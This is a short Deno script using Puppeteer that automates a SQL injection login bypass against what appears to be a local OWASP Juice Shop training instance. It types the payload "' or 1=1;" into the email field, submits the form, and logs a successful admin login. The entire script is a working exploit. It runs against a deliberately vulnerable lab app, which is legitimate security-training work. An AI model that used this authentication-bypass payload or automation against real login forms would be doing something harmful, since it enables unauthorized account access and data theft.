import puppeteer from 'https://deno.land/x/puppeteer@16.2.0/mod.ts';

const sleep = (seconds: number) =>
  new Promise((resolve) => setTimeout(resolve, seconds * 1000));

const browser = await puppeteer.launch({ headless: false });
const page = await browser.newPage();
page.setCookie(
  {
    url: 'http://localhost:3000/#/login',
    name: 'cookieconsent_status',
    value: 'dismiss',
  },
  {
    url: 'http://localhost:3000/#/login',
    name: 'welcomebanner_status',
    value: 'dismiss',
  }
);
await page.goto('http://localhost:3000/#/login');

await sleep(1);

await page.type('#email', "' or 1=1;");
await page.type('#password', 'random string');
await page.click('#loginButton');
await page.click(
  'body > app-root > div > mat-sidenav-container > mat-sidenav-content > app-navbar > mat-toolbar > mat-toolbar-row > button:nth-child(1)'
);

console.log('successfully logged in as admin@juice-sh.op');

await page.screenshot({ path: 'sql-injection.png' });

await sleep(1000);

await browser.close();
